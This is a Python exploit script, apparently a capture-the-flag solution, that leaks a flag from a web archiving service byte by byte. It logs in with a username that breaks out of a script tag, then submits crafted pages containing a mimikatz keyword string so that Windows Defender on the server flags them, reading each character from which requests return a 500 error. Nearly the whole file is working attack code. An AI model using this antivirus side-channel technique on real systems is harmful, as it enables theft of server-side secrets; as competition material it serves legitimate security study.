import requests

URL = "http://192.168.100.191"
URL = "http://192.168.122.78"

def randstr(n=8):
    import random
    import string
    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return ''.join([random.choice(chars) for _ in range(n)])

def trigger(c, idx, sess):
    import string
    prefix = randstr()
    p1 = prefix + '''<body><script>f=function(n){eval('mimikatzinmemoryusingpowershell'+String.fromCharCode(n^${c})+'canbeusedtodumpcredentialswithoutwritinganythingtodisk')};f(document.body.innerHTML[${idx}].charCodeAt(0));/*'''
    p2 = '''</body>'''
    p1 = string.Template(p1).substitute({'idx': '0x{0:03x}'.format(idx), 'c': '0x{0:02x}'.format(c)})
    req = sess.post(URL + '/gyotaku', data={'url': 'http://127.0.0.1/flag?a=' + p1})
    return req.json()

def leak_data(idx, sess):
    # spray payload
    history = dict()
    for c in range(0x100):
        history[c] = trigger(c, idx, sess)

    # check if Windows Defender get angry
    for c in range(0x100):
        gid = history[c]
        if sess.get(URL + '/gyotaku/' + gid).status_code == 500:
            return chr(0x2e^c)

def check_heuristic():
    p = '''<body>.<script>f=function(n){eval('mimikatzinmemoryusingpowershell'+String.fromCharCode(n^0x0)+'canbeusedtodumpcredentialswithoutwritinganythingtodisk')};f(document.body.innerHTML[0].charCodeAt(0));/*'''
    username = '*/</script></body>'

    sess = requests.session()
    sess.post(URL + '/login', data={'username': username+randstr(), 'password': randstr()})
    p = randstr() + p
    req = sess.post(URL + '/gyotaku', data={'url': 'http://127.0.0.1/flag?a=' + p})
    gid = req.json()
    print(sess.get(URL + '/gyotaku/' + gid).content)

# check_heuristic()
# exit(0)

sess = requests.session()
sess.post(URL + '/login', data={'username': '*/</script></body>'+randstr(), 'password': randstr()})

flag_len = 30
flag_offset = 200

for i in range(flag_len):
    print(leak_data(flag_offset+i, sess))
